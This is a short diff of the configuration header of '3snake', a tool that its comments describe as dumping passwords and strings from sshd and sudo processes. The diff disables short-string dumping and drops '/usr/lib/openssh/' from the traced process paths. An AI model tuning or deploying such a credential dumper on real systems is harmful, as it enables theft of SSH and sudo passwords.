@@ -9,7 +9,7 @@
 #define ENABLE_PASSWD     1
 
 // Dump strings that are less than 5 characters from openssh server
-#define SHORT_SSH_STRINGS 1
+#define SHORT_SSH_STRINGS 0
 
 // Optimization variables
 #define MAX_PASSWORD_LEN 256
@@ -18,7 +18,7 @@
 #define ROOT_DIR "/tmp"
 
 //Process paths where sshd and sudo can exist (so random users on the system can't trigger 3snake with their own processes)
-#define CONFIG_PROCESS_PATHS 6
+#define CONFIG_PROCESS_PATHS 5
 
 #ifdef FILE_TRACERS
 static const char *config_valid_process_paths[CONFIG_PROCESS_PATHS + 1] = {
@@ -27,7 +27,6 @@ static const char *config_valid_process_paths[CONFIG_PROCESS_PATHS + 1] = {
   "/usr/local/sbin/",
   "/usr/bin/",
   "/usr/sbin/",
-  "/usr/lib/openssh/",
   NULL
 };
 #endif
